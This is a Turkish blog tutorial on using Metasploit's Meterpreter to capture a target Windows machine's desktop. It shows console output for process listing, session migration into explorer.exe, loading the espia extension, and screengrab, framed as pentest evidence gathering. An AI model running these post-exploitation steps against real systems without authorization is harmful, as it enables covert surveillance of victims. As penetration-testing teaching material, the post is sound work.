---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:38:00Z"
excerpt: Meterpreter shell oturumunun sağladığı imkanlardan bir tanesi de hedef bilgisayarın
  Masaüstü görüntüsünü kaydedebilmektir. Bu yöntemle Masaüstü görüntüsü alma, genellikle
  pentest işlemlerinde ispat olarak kullanılır.
guid: https://www.siberoloji.com/?p=1197
id: 1197
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Ekran Yakalama
url: /tr/msf-ekran-yakalama/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="ekran-yakalama">Ekran Yakalama 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Meterpreter shell oturumunun sağladığı imkanlardan bir tanesi de hedef bilgisayarın Masaüstü görüntüsünü kaydedebilmektir. Bu yöntemle Masaüstü görüntüsü alma, genellikle pentest işlemlerinde ispat olarak kullanılır.
  

<!-- wp:paragraph -->
<p>Meterpreter oturum açtığınızda, oturumu&nbsp;<code>explorer.exe</code>&nbsp;prosesine taşınmalısınız. Aşağıdaki örnekte öncelikle sistemde çalışan programlar kontrol edilmektedir.
  

<!-- wp:paragraph -->
<p>Hedef bilgisayarda meterpreter oturum açtığınızı farz ediyoruz. Öncelikle çalışan işlemlere bakalım. Bunun için&nbsp;<code>ps</code>&nbsp;komutunu kullanabilirsiniz.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">***[*** ******* ***]***  Started bind handler
***[*** ******* ***]***  Trying target Windows XP SP2 - English...
***[*** ******* ***]***  Sending stage ***(*** 719360 bytes***)*** 
***[*** ******* ***]***  Meterpreter session 1 opened ***(*** 192.168.1.101:34117 -&gt; 192.168.1.104:4444***)*** 

meterpreter ***&gt;***  ps

Process list
***============*** 

    PID   Name                 Path
    ---   ----                 ----
    180   notepad.exe          C:\WINDOWS\system32\notepad.exe
    248   snmp.exe             C:\WINDOWS\System32\snmp.exe
    260   Explorer.EXE         C:\WINDOWS\Explorer.EXE
    284   surgemail.exe        c:\surgemail\surgemail.exe
    332   VMwareService.exe    C:\Program Files\VMware\VMware Tools\VMwareService.exe
    612   VMwareTray.exe       C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    620   VMwareUser.exe       C:\Program Files\VMware\VMware Tools\VMwareUser.exe
    648   ctfmon.exe           C:\WINDOWS\system32\ctfmon.exe
    664   GrooveMonitor.exe    C:\Program Files\Microsoft Office\Office12\GrooveMonitor.exe
    728   WZCSLDR2.exe         C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
    736   jusched.exe          C:\Program Files\Java\jre6\b***in*** \jusched.exe
    756   msmsgs.exe           C:\Program Files\Messenger\msmsgs.exe
    816   smss.exe             \SystemRoot\System32\smss.exe
    832   alg.exe              C:\WINDOWS\System32\alg.exe
    904   csrss.exe            \??\C:\WINDOWS\system32\csrss.exe
    928   winlogon.exe         \??\C:\WINDOWS\system32\winlogon.exe
    972   services.exe         C:\WINDOWS\system32\services.exe
    984   lsass.exe            C:\WINDOWS\system32\lsass.exe
    1152  vmacthlp.exe         C:\Program Files\VMware\VMware Tools\vmacthlp.exe
    1164  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1276  nwauth.exe           c:\surgemail\nwauth.exe
    1296  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1404  svchost.exe          C:\WINDOWS\System32\svchost.exe
    1500  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1652  svchost.exe          C:\WINDOWS\system32\svchost.exe
    1796  spoolsv.exe          C:\WINDOWS\system32\spoolsv.exe
    1912  3proxy.exe           C:\3proxy\b***in*** \3proxy.exe
    2024  jqs.exe              C:\Program Files\Java\jre6\b***in*** \jqs.exe
    2188  swatch.exe           c:\surgemail\swatch.exe
    2444  iexplore.exe         C:\Program Files\Internet Explorer\iexplore.exe
    3004  cmd.exe              C:\WINDOWS\system32\cmd.exe
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Örnek çıktıda görüldüğü gibi&nbsp;<code>explorer.exe</code>&nbsp;260 PID numarasıyla çalışmaktadır.&nbsp;<code>migrate</code>&nbsp;komutuyla Meterpreter oturumunu&nbsp;<code>explorer.exe</code>&nbsp;içine taşıyalım.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  migrate 260
***[*** ******* ***]***  Migrating to 260...
***[*** ******* ***]***  Migration completed successfully.
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Ardından&nbsp;<code>espia</code>&nbsp;eklentisini aktif hale getirelim.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  use espia
Loading extension espia...success.
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>screengrab</code>&nbsp;komutuyla hedef bilgisayarın Masaüstü görüntüsünü kaydedelim.
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  screengrab
Screenshot saved to: /root/nYdRUppb.jpeg
meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Gördüğünüz gibi Masaüstü resmi yerel bilgisayarımıza kaydedildi. Bu işlemi yaparken&nbsp;<code>explorer.exe</code>&nbsp;veya benzeri şekilde klasör ve dosyalar üzerinde işlem yapabilen bir programa geçiş yapmanız önemlidir. Aksi takdirde&nbsp;<code>screengrab</code>&nbsp;komutu çalışmayabilir.
  